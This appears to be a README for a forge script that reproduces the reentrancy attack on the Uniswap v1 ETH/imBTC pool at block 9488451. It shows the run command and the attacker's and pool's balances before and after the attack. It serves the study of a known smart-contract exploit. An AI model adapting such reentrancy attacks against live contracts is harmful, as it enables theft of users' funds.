# Uniswap imBTC reentrant hack testing.

## Block Number

9488451

## Victim

uniswap v1 `ETH/imBTC(ERC777)` exchange pool

## Run

```bash
forge script script/Script.s.sol

[⠔] Compiling...
No files changed, compilation skipped
Script ran successfully.
Gas used: 1524702

== Logs ==
  before attacker ETH: 3600000000000000000000
  before attacker imBTC: 0
  before pool ETH: 718529642351924552227
  before pool imBTC: 1959698094
  ----attack----
  after attacker ETH: 58284156552147589474
  after attacker imBTC: 1940237338
  after pool ETH: 4260245485799776962753
  after pool imBTC: 19460756
```
